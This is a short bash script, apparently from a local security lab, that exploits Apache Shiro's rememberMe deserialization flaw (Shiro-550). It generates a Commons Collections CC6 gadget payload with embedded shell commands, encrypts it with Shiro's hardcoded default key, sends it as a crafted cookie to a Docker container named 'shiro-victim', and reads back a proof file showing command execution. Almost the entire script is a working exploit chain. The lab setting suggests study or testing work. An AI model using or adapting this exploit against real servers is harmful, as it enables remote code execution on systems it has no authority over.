#!/bin/bash
set -e
D=/root/labs/deser-classics/cc-gadget

echo "=== regenerating fresh CC6 payload + shiro proof marker ==="
docker exec shiro-victim rm -f /tmp/shiro-proof.txt 2>/dev/null || true
java -cp "$D:$D/commons-collections-3.2.1.jar" GenCC6 \
  'id > /tmp/shiro-proof.txt; hostname >> /tmp/shiro-proof.txt; echo SHIRO-550-CONFIRMED >> /tmp/shiro-proof.txt' \
  "$D/shiro-payload.bin"

echo "=== encrypting with Shiro's hardcoded default key ==="
java -cp "$D" EncryptForShiro "$D/shiro-payload.bin" > "$D/cookie.txt"
COOKIE=$(cat "$D/cookie.txt")
echo "cookie length: ${#COOKIE}"

echo "=== baseline request (no cookie) ==="
curl -s http://localhost:18100/
echo

echo "=== sending crafted rememberMe cookie ==="
curl -s -H "Cookie: rememberMe=${COOKIE}" http://localhost:18100/
echo
sleep 1

echo "=== victim server log ==="
docker logs shiro-victim --tail 6

echo "=== proof file INSIDE shiro-victim container ==="
docker exec shiro-victim cat /tmp/shiro-proof.txt
